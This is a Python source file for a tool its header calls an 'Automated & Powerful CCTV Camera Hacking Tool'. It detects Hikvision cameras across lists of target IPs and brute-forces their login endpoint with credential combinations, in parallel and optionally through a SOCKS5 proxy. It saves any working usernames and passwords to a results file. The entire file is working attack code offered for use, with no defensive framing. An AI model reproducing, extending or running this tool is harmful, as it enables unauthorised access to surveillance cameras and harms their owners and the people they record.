'''
    EyePwn - Automated & Powerful CCTV Camera Hacking Tool

    ---> Scan the all IPs Automatically for CCTV and also Bruteforce it.

    Speacially focused on Hikivision (The authentication loopholes in it...)

    By: HM

'''

import asyncio
import aiohttp
import argparse
import itertools
import re
import os
from aiofiles import open as aio_open
from tqdm import tqdm
import aiofiles

GREEN = "\033[92m"  
RED = "\033[91m"    
RESET = "\033[0m"   

def parse_args():
    parser = argparse.ArgumentParser(description="Brute-force Hikvision IP cameras.")
    parser.add_argument("-tf", "--targets_file", type=str, help="File with target IPs")
    parser.add_argument("-cf", "--combo_file", type=str, help="File with login:password combos")
    parser.add_argument("-lf", "--logins_file", type=str, help="File with logins")
    parser.add_argument("-pf", "--passwords_file", type=str, help="File with passwords")
    parser.add_argument("-r", "--results_file", type=str, help="File to store successful attempts")
    parser.add_argument("-t", "--threads", type=int, default=100, help="Number of parallel connections")
    parser.add_argument("-to", "--timeout", type=int, default=12, help="Timeout for requests")
    parser.add_argument("-p", "--proxy", type=str, help="SOCKS5 proxy (e.g., socks5://127.0.0.1:9050)")
    parser.add_argument("-glc", "--generate_login_combo", action="store_true", help="Generate login:login combos")
    parser.add_argument("-d", "--debug", action="store_true", help="Enable debug output")
    parser.add_argument("--no-camera-check", action="store_true", help="Skip camera detection and brute-force all targets")
    return parser.parse_args()

# Load data from files asynchronously
async def load_file(filepath):
    if not filepath or not os.path.exists(filepath):
        return []
    async with aio_open(filepath, mode='r') as f:
        return list(set([line.strip() for line in await f.readlines() if line.strip()]))

# Generate login-password combinations
def generate_combinations(logins, passwords, existing_combos, generate_login_combo):
    new_combos = set(existing_combos)
    if logins and passwords:
        new_combos.update(f"{l}:{p}" for l, p in itertools.product(logins, passwords) if f"{l}:{p}" not in existing_combos)
    if generate_login_combo:
        new_combos.update(f"{l}:{l}" for l in logins if f"{l}:{l}" not in existing_combos)
    return list(new_combos)

# Check if device is a Hikvision camera
async def is_camera(session, ip, timeout, debug):
    patterns = {
        f"http://{ip}/doc/page/login.asp": re.compile(r"Hikvision", re.I),
        f"http://{ip}/ISAPI/Security/extern/capabilities": re.compile(r"Hikvision", re.I),
    }
    for url, pattern in patterns.items():
        try:
            async with session.get(url, timeout=timeout) as resp:
                text = await resp.text()
                if debug:
                    print(f"[DEBUG] {url} response: {text[:500]}")  # Print first 500 chars
                if pattern.search(text):
                    return True
        except Exception as e:
            print(f"[ERROR] Failed to connect to {url}: {e}")
    return False


# Attempt login to camera
async def attempt_login(session, ip, username, password, timeout):
    url = f"http://{ip}/ISAPI/Security/userCheck"
    try:
        async with session.get(url, auth=aiohttp.BasicAuth(username, password), timeout=timeout) as resp:
            text = await resp.text()
            print(f"[DEBUG] Attempting {username}:{password} on {ip}, response: {text[:500]}")
            return "<statusString>OK</statusString>" in text
    except Exception as e:
        print(f"[ERROR] Login failed for {ip} with {username}:{password}: {e}")
        return False


# Brute-force loop
async def bruteforce_worker(ip, session, combos, timeout, results_file, progress):
    print(f"[DEBUG] Starting brute-force on {ip} with {len(combos)} combos")
    
    for combo in combos:
        username, password = combo.split(":", 1)
        print(f"[DEBUG] Trying {username}:{password} on {ip}")
        
        success = await attempt_login(session, ip, username, password, timeout)
        progress.update(1)
        
        if success:
            success_message = f"{GREEN}[SUCCESS] {ip} - {username}:{password}{RESET}"
            print(success_message)
            
            if results_file:
                try:
                    async with aiofiles.open(results_file, mode='a') as f:
                        await f.write(f"{ip},{username},{password}\n")
                except Exception as e:
                    print(f"[ERROR] Failed to write results: {e}")
            
            return True
    
    print(f"{RED}[FAILED] No valid credentials for {ip}{RESET}")
    return False


async def main():
    args = parse_args()
    
    target_ips = await load_file(args.targets_file)
    existing_combos = await load_file(args.combo_file)
    logins = await load_file(args.logins_file)
    passwords = await load_file(args.passwords_file)

    print(f"Loaded {len(target_ips)} target IPs")
    print(f"Loaded {len(existing_combos)} existing combos")
    print(f"Loaded {len(logins)} logins")
    print(f"Loaded {len(passwords)} passwords")

    combos = generate_combinations(logins, passwords, existing_combos, args.generate_login_combo)
    print(f"Generated {len(combos)} login-password combinations.")

    if not target_ips:
        print("No target IPs loaded. Check your target file.")
        return

    if not combos:
        print("No login:password combinations generated!")
        return

    timeout = aiohttp.ClientTimeout(total=args.timeout)
    connector = aiohttp.TCPConnector(limit_per_host=args.threads)
    
    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        tasks = []
        with tqdm(total=len(target_ips) * len(combos)) as progress:
            for ip in target_ips:
                tasks.append(bruteforce_worker(ip, session, combos, timeout, args.results_file, progress))
            await asyncio.gather(*tasks)


if __name__ == "__main__":
    asyncio.run(main())
